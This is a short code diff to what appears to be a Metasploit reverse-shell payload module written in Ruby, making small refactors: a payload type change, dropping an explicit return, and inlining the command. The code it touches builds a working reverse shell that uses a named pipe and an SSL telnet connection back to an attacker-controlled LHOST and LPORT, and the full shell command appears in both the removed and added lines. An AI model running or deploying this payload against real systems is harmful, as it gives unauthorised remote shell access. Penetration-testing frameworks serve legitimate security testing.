@@ -29,7 +29,7 @@ module MetasploitModule
       'Arch'          => ARCH_CMD,
       'Handler'       => Msf::Handler::ReverseTcpSsl,
       'Session'       => Msf::Sessions::CommandShell,
-      'PayloadType'   => 'cmd_bash',
+      'PayloadType'   => 'cmd',
       'RequiredCmd'   => 'telnet',
       'Payload'       =>
         {
@@ -44,7 +44,7 @@ module MetasploitModule
   #
   def generate
     vprint_good(command_string)
-    return super + command_string
+    super + command_string
   end
 
   #
@@ -52,6 +52,6 @@ module MetasploitModule
   #
   def command_string
     pipe_name = Rex::Text.rand_text_alpha( rand(4) + 8 )
-    cmd = "mkfifo #{pipe_name} && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
+    "mkfifo #{pipe_name} && telnet -z verify=0 #{datastore['LHOST']} #{datastore['LPORT']} 0<#{pipe_name} | $(which $0) 1>#{pipe_name} & sleep 10 && rm #{pipe_name} &"
   end
 end
